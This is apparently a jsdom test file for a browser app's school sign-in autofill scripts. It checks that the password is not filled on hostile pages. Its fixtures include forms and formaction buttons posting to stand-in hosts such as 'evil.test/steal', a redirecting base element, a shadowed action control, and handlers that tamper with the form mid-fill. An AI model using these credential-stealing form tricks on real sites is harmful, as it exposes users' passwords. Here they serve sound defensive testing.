// The browser's school sign-in scripts (app/.../browser/BrowserSiteSignInScripts.kt), run in jsdom
// against small copies of the sites' forms: the iPhone's page-test cases, the two-step flow, and the
// pages that must get no password (a replaced document, the id's event handlers changing the form, a
// token the page set itself, a formaction or a shadowed action posting elsewhere). The scripts are
// the ones Kotlin generates: SiteSignInScriptsExport, in :app's play unit tests, writes them to
// app/build/site-sign-in-scripts. Run: npm ci --prefix tools/page-scripts, then
// node tools/page-scripts/site-sign-in.test.cjs app/build/site-sign-in-scripts
const path = require('path');
const [scriptsDir] = process.argv.slice(2);
const { JSDOM } = require('jsdom');
const fs = require('fs');
const read = (name) => fs.readFileSync(path.join(scriptsDir, name + '.js'), 'utf8');
const KEY = fs.readFileSync(path.join(scriptsDir, 'property.txt'), 'utf8').trim();
const PLACEHOLDER = '"0123456789abcdef0123456789abcdef"';

const ETHICS = 'https://stuinfosys.ntust.edu.tw/Authenticate/Account/EnrollStudent/ethicscourse';
const CARD = 'https://cardsystem.ntust.edu.tw/std/index.php/user/login';
const ethicsForm = `<form method="post" action="/Authenticate/Account/EnrollStudent/ethicscourse">
<input name="__RequestVerificationToken" type="hidden" value="t">
<input name="UserName" type="text"><input name="Password" type="password">
<img id="valiCode" alt=""><input name="VerifyCode" type="text">
<input type="submit" value="sign in"><input name="SystemName" type="hidden" value="ethicscourse">
</form>`;
const cardForm = `<form id="form1" method="post" action="https://cardsystem.ntust.edu.tw/std/index.php/user/agreement">
<input name="id" type="text"><input name="password" type="password"><input name="verify" type="text">
<input id="button" type="submit" value="sign in"><input name="utoken" type="hidden" value="t"></form>`;

let failures = 0, passes = 0;
function expect(label, actual, expected) {
  const a = JSON.stringify(actual), e = JSON.stringify(expected);
  if (a === e) { passes++; console.log('pass', label); } else { failures++; console.log('FAIL', label, 'got', a, 'expected', e); }
}
function page(body, url, setup = '') {
  const dom = new JSDOM(`<!doctype html><body>${body}</body>`, { url, runScripts: 'outside-only' });
  const w = dom.window;
  w.submitted = 0; w.clicked = 0;
  w.HTMLFormElement.prototype.submit = function () { w.submitted++; };
  w.HTMLFormElement.prototype.requestSubmit = function () { w.submitted++; };
  w.document.addEventListener('submit', () => w.submitted++, true);
  w.document.addEventListener('click', () => w.clicked++, true);
  if (setup) w.eval(setup);
  return w;
}
const values = (w, names) => names.map((n) => w.document.getElementsByName(n)[0].value);
const run = (w, script) => w.eval(script);
const withToken = (script, token) => script.split(PLACEHOLDER).join(JSON.stringify(token));
/** As the app does: the mark, then, for a token, the fill carrying it. */
function signIn(w, name, fill = name + '-fill') {
  const mark = run(w, read(name + '-mark'));
  if (!mark || typeof mark !== 'object' || !mark.token) return { mark, fill: undefined };
  return { mark, fill: run(w, withToken(read(fill), mark.token)) };
}

// --- iOS cases, through both phases ---
{
  const w = page(ethicsForm, ETHICS, `window.typed = []; window.changed = [];
    document.querySelectorAll('input').forEach((i) => { i.addEventListener('input', () => typed.push(i.name)); i.addEventListener('change', () => changed.push(i.name)); });`);
  const { mark, fill } = signIn(w, 'ethics');
  expect('ethics: mark answers a 128-bit hex token', /^[0-9a-f]{32}$/.test(mark.token), true);
  expect('ethics: mark answers the address', mark.href, ETHICS);
  expect('ethics: fill true', fill, true);
  expect('ethics: id and password, CAPTCHA left', values(w, ['UserName', 'Password', 'VerifyCode']), ['B00000001', 'not-a-password', '']);
  expect('ethics: input events', w.typed, ['UserName', 'Password']);
  expect('ethics: change events', w.changed, ['UserName', 'Password']);
  expect('ethics: hidden fields kept', values(w, ['__RequestVerificationToken', 'SystemName']), ['t', 'ethicscourse']);
  expect('ethics: nothing submitted or clicked', [w.submitted, w.clicked], [0, 0]);
  expect('token property: not enumerable', Object.keys(w).includes(KEY), false);
  w.eval(`window[${JSON.stringify(KEY)}] = 'x';`);
  expect('token property: a page cannot write it', w[KEY], mark.token);
  expect('token property: nor delete it', w.eval(`delete window[${JSON.stringify(KEY)}]`), false);
  let redefined = true;
  try { w.eval(`Object.defineProperty(window, ${JSON.stringify(KEY)}, { value: 'x' })`); } catch (e) { redefined = false; }
  expect('token property: nor redefine it', [redefined, w[KEY]], [false, mark.token]);
}
{
  // Two flows on one page (a second onPageFinished): the second mark answers no token, and the
  // first flow's token still fills.
  const w = page(cardForm, CARD);
  const first = run(w, read('card-mark'));
  const second = run(w, read('card-mark'));
  expect('a second mark answers no token', [typeof first.token, second.token], ['string', null]);
  expect('and the first token still fills', [run(w, withToken(read('card-fill'), first.token)), values(w, ['id', 'password'])], [true, ['B00000001', 'not-a-password']]);
}
{
  const w = page(ethicsForm.replace('/Authenticate/Account/EnrollStudent/ethicscourse', '/Authenticate/SSOAccount/Index/SSOcgesocial'),
    'https://stuinfosys.ntust.edu.tw/Authenticate/SSOAccount/Index/SSOcgesocial');
  signIn(w, 'social');
  expect('social practice fills', values(w, ['UserName', 'Password', 'VerifyCode']), ['B00000001', 'not-a-password', '']);
}
{
  const w = page(cardForm, CARD);
  signIn(w, 'card');
  expect('card fills, leaves CAPTCHA and token', values(w, ['id', 'password', 'verify', 'utoken']), ['B00000001', 'not-a-password', '', 't']);
}
{
  const form = `<form id="Form1" method="post" action="./"><input name="__VIEWSTATE" type="hidden" value="v">
<input name="studentno" type="text"><input name="password" type="password"><input name="code_box" type="text">
<input name="Button1" type="submit" value="sign in"></form>`;
  const w = page(form, 'https://studentpay.ntust.edu.tw/');
  signIn(w, 'pay');
  expect('work-study fills, leaves CAPTCHA', values(w, ['studentno', 'password', 'code_box', '__VIEWSTATE']), ['B00000001', 'not-a-password', '', 'v']);
}
{
  const forms = `<form method="post" action="/send-forget-email"><input name="_token" type="hidden" value="t">
<input name="student_id" type="text"><button type="submit">send</button></form>
<form class="form_login" method="post" action="/login"><input name="_token" type="hidden" value="t">
<input name="account"><input name="password" type="password">
<div id="grecaptcha"><textarea name="g-recaptcha-response"></textarea></div><button type="submit">sign in</button></form>
<form method="post" action="/send-email"><input name="student_id" type="text"><button type="submit">send</button></form>`;
  const w = page(forms, 'https://suggestionbox.ntust.edu.tw/login');
  const { mark } = signIn(w, 'box');
  expect('suggestion box: no token', mark.token, null);
  expect('suggestion box: no token property', Object.getOwnPropertyDescriptor(w, KEY), undefined);
  expect('suggestion box: account alone', values(w, ['account', 'password', 'g-recaptcha-response']), ['B00000001', '', '']);
  expect('suggestion box: other forms left', [...w.document.getElementsByName('student_id')].map((f) => f.value), ['', '']);
}
{
  const other = page(ethicsForm, ETHICS, "document.getElementsByName('UserName')[0].value = 'M11000000'");
  expect('a typed id: fill false', signIn(other, 'ethics').fill, false);
  expect('a typed id is kept, and gets no password', values(other, ['UserName', 'Password']), ['M11000000', '']);
  const same = page(ethicsForm, ETHICS, "document.getElementsByName('UserName')[0].value = 'B00000001'");
  signIn(same, 'ethics');
  expect('the stored id typed gets the password', values(same, ['UserName', 'Password']), ['B00000001', 'not-a-password']);
  const typed = page(ethicsForm, ETHICS, "document.getElementsByName('Password')[0].value = 'mine'");
  signIn(typed, 'ethics');
  expect('a typed password is kept', values(typed, ['UserName', 'Password']), ['B00000001', 'mine']);
}
{
  const split = '<form action="/a"><input name="UserName" type="text"></form><form action="/b"><input name="Password" type="password"></form>';
  const apart = page(split, ETHICS);
  expect('split forms: fill false', signIn(apart, 'ethics').fill, false);
  expect('split forms: nothing', values(apart, ['UserName', 'Password']), ['', '']);
  const away = page(ethicsForm.replace('action="/Authenticate/Account/EnrollStudent/ethicscourse"', 'action="https://elsewhere.test/collect"'), ETHICS);
  expect('posts elsewhere: fill false', signIn(away, 'ethics').fill, false);
  expect('posts elsewhere: nothing', values(away, ['UserName', 'Password']), ['', '']);
  const formless = page('<input name="UserName" type="text"><input name="Password" type="password">', ETHICS);
  signIn(formless, 'ethics');
  expect('fields in no form: nothing', values(formless, ['UserName', 'Password']), ['', '']);
  const plain = page(ethicsForm.replace('name="Password" type="password"', 'name="Password" type="text"'), ETHICS);
  signIn(plain, 'ethics');
  expect('a text password field: nothing', values(plain, ['UserName', 'Password']), ['', '']);
}
{
  const other = page(ethicsForm, 'https://stuinfosys.ntust.edu.tw/Authenticate/Account/EnrollStudent/other');
  const { mark } = signIn(other, 'ethics');
  expect('another path: the mark answers null, nothing filled', [mark, values(other, ['UserName', 'Password'])], [null, ['', '']]);
  const http = page(ethicsForm, 'http://stuinfosys.ntust.edu.tw/Authenticate/Account/EnrollStudent/ethicscourse');
  expect('an http page: the mark answers null', signIn(http, 'ethics').mark, null);
  const w = page(ethicsForm, ETHICS);
  expect('the social mark on the ethics page answers null', run(w, read('social-mark')), null);
  expect('the social fill on the ethics page answers null', run(w, read('social-fill')), null);
  expect('so nothing is filled', values(w, ['UserName', 'Password']), ['', '']);
}
{
  const w = page(ethicsForm, ETHICS);
  signIn(w, 'ethics', 'ethics-fill-evil');
  expect('an exotic password lands as stored (the input strips its line feed)', values(w, ['Password']), ["fake-pass'\"\\</script>\u2028\u2029"]);
  expect('and adds no script', w.document.querySelectorAll('script').length, 0);
}
{
  const w = page(ethicsForm, ETHICS, "window.URL = function () { throw new Error('broken'); };");
  expect('a page that breaks URL: the mark answers failed', run(w, read('ethics-mark')), 'failed');
  expect('and nothing is filled', values(w, ['UserName', 'Password']), ['', '']);
}

// --- A document that replaced the marked one has no token, and gets nothing ---
{
  const marked = page(cardForm, CARD);
  const { token } = run(marked, read('card-mark'));
  const replaced = page(cardForm, CARD);
  expect('replaced document: fill answers false', run(replaced, withToken(read('card-fill'), token)), false);
  expect('replaced document: nothing filled', values(replaced, ['id', 'password']), ['', '']);
  const replacedMarked = page(cardForm, CARD);
  const own = run(replacedMarked, read('card-mark')).token;
  expect('a replacement marked by its own mark has another token', own !== token, true);
  expect('so the first token gets no password there', [run(replacedMarked, withToken(read('card-fill'), token)), values(replacedMarked, ['password'])], [false, ['']]);
}

// --- The id's events cannot undo the guards before the password ---
{
  const handlers = {
    'moves the form elsewhere': "f.action = 'https://elsewhere.test/collect';",
    'makes the password field plain text': "document.getElementsByName('password')[0].type = 'text';",
    'changes the id': "document.getElementsByName('id')[0].value = 'M11000000';",
    'swaps the password field for another': "const old = document.getElementsByName('password')[0]; const twin = old.cloneNode(); old.replaceWith(twin);",
    'moves the password field into another form': "const other = document.createElement('form'); other.action = '/x'; document.body.appendChild(other); other.appendChild(document.getElementsByName('password')[0]);",
    'leaves the page': "history.replaceState(null, '', '/std/index.php/user/other');",
    'types a password itself': "document.getElementsByName('password')[0].value = 'typed';",
  };
  for (const [what, act] of Object.entries(handlers)) {
    // The id was filled by the mark and cleared by the student; the fill types it again.
    const w = page(cardForm, CARD);
    const { token } = run(w, read('card-mark'));
    w.eval(`const f = document.getElementById('form1'); const id = document.getElementsByName('id')[0]; id.value = '';
      id.addEventListener('input', () => { ${act} }, { once: true });`);
    const filled = run(w, withToken(read('card-fill'), token));
    const secret = w.document.getElementsByName('password')[0];
    const leaked = [...w.document.querySelectorAll('input')].some((input) => input.value === 'not-a-password');
    expect(`a handler on the id's input that ${what}: no password`, [filled, leaked], [false, false]);
    if (what === 'types a password itself') expect('  and the typed one stays', secret.value, 'typed');
  }
  // The same handler, firing as the mark fills the id: the fill's first guards stop it.
  const early = page(cardForm, CARD, "document.getElementsByName('id')[0].addEventListener('input', () => { document.getElementById('form1').action = 'https://elsewhere.test/'; });");
  const { fill } = signIn(early, 'card');
  expect("a handler on the id's input during the mark: no password", [fill, values(early, ['password'])], [false, ['']]);
}

// --- A page that sets the token's property itself gets no token ---
{
  const presets = {
    'a plain string': `window[${JSON.stringify(KEY)}] = '0123456789abcdef0123456789abcdef';`,
    'a getter': `Object.defineProperty(window, ${JSON.stringify(KEY)}, { get: () => '0123456789abcdef0123456789abcdef', configurable: false });`,
    'a fixed object': `Object.defineProperty(window, ${JSON.stringify(KEY)}, { value: {}, configurable: false });`,
    'a short string, locked': `Object.defineProperty(window, ${JSON.stringify(KEY)}, { value: 'abc', configurable: false });`,
    'a token in the mark\'s own shape': `Object.defineProperty(window, ${JSON.stringify(KEY)}, { value: 'ffffffffffffffffffffffffffffffff' });`,
  };
  for (const [what, preset] of Object.entries(presets)) {
    const w = page(cardForm, CARD, preset);
    const { mark, fill } = signIn(w, 'card');
    expect(`a page that pre-sets the property as ${what}: no token, no fill`, [mark && mark.token, fill], [null, undefined]);
    expect('  its id is filled all the same', values(w, ['id', 'password']), ['B00000001', '']);
  }
}

// --- Two phases: the id first, the password after, and a typed id in between stops it ---
{
  const w = page(cardForm, CARD, `window.typed = []; document.querySelectorAll('input').forEach((i) => i.addEventListener('input', () => typed.push(i.name)));`);
  const { token } = run(w, read('card-mark'));
  expect('two-phase: the id at once', values(w, ['id', 'password']), ['B00000001', '']);
  run(w, withToken(read('card-fill'), token));
  expect('two-phase: the password beside it', values(w, ['id', 'password', 'verify']), ['B00000001', 'not-a-password', '']);
  expect('two-phase: one input event per field', w.typed, ['id', 'password']);
  const changed = page(cardForm, CARD);
  const second = run(changed, read('card-mark')).token;
  changed.document.getElementsByName('id')[0].value = 'M11000000';
  run(changed, withToken(read('card-fill'), second));
  expect('two-phase: a typed id in between gets no password', values(changed, ['id', 'password']), ['M11000000', '']);
}


// --- A button's formaction, and a control named action shadowing form.action ---
{
  const elsewhere = (extra) => cardForm.replace('<input id="button"', extra + '<input id="button"');
  const cases = {
    'a submit button whose formaction posts to another origin': '<button type="submit" formaction="https://evil.test/steal">go</button>',
    'an image input whose formaction posts to another origin': '<input type="image" formaction="https://evil.test/steal" alt="go">',
    'a submit input whose formaction posts to another origin': '<input type="submit" formaction="//evil.test/steal" value="go">',
  };
  for (const [what, extra] of Object.entries(cases)) {
    const w = page(elsewhere(extra), CARD);
    const { mark, fill } = signIn(w, 'card');
    expect(`${what}: nothing filled`, [typeof mark.token, fill, values(w, ['id', 'password'])], ['string', false, ['', '']]);
  }
  const outside = page(cardForm + '<button type="submit" form="form1" formaction="https://evil.test/steal">go</button>', CARD);
  const o = signIn(outside, 'card');
  expect('a button outside the form, tied to it by form=, posting elsewhere: nothing filled', [o.fill, values(outside, ['id', 'password'])], [false, ['', '']]);
  const sameOrigin = page(elsewhere('<button type="submit" formaction="/std/index.php/user/agreement2">go</button>'), CARD);
  const same = signIn(sameOrigin, 'card');
  expect('a formaction on the page\'s own origin still fills', [same.fill, values(sameOrigin, ['id', 'password'])], [true, ['B00000001', 'not-a-password']]);
  const otherForm = page(cardForm + '<form action="https://evil.test/x"><button type="submit" formaction="https://evil.test/steal">go</button></form>', CARD);
  const of = signIn(otherForm, 'card');
  expect('a formaction in another form does not stop this one', [of.fill, values(otherForm, ['id', 'password'])], [true, ['B00000001', 'not-a-password']]);
  const shadowedForm = `<form id="form1" method="post" action="https://evil.test/steal">
<input name="action" type="hidden" value="https://cardsystem.ntust.edu.tw/std/index.php/user/agreement">
<input name="id" type="text"><input name="password" type="password"><input name="verify" type="text"></form>`;
  const shadowed = page(shadowedForm, CARD);
  const sh = signIn(shadowed, 'card');
  expect('a control named action does not hide where the form posts', [sh.fill, values(shadowed, ['id', 'password'])], [false, ['', '']]);
  const later = page(cardForm, CARD, `document.getElementsByName('id')[0].addEventListener('input', () => {
    const b = document.createElement('button'); b.type = 'submit'; b.setAttribute('formaction', 'https://evil.test/steal'); document.getElementById('form1').appendChild(b); });`);
  const l = signIn(later, 'card');
  expect('a formaction added by the id\'s input handler stops the password', [l.fill, values(later, ['id', 'password'])], [false, ['B00000001', '']]);
  const base = page(cardForm.replace('action="https://cardsystem.ntust.edu.tw/std/index.php/user/agreement"', 'action="steal"'), CARD,
    `const b = document.createElement('base'); b.href = 'https://evil.test/'; document.head.appendChild(b);`);
  const bs = signIn(base, 'card');
  expect('a relative action under a base on another origin: nothing filled', [bs.fill, values(base, ['id', 'password'])], [false, ['', '']]);
  const named = page(cardForm + '<img name="baseURI" alt="">', CARD);
  const nm = signIn(named, 'card');
  expect('an element named baseURI does not change how a formaction resolves', [nm.fill, values(named, ['id', 'password'])], [true, ['B00000001', 'not-a-password']]);
}

console.log(`${passes} passed, ${failures} failed`);
process.exit(failures ? 1 : 0);
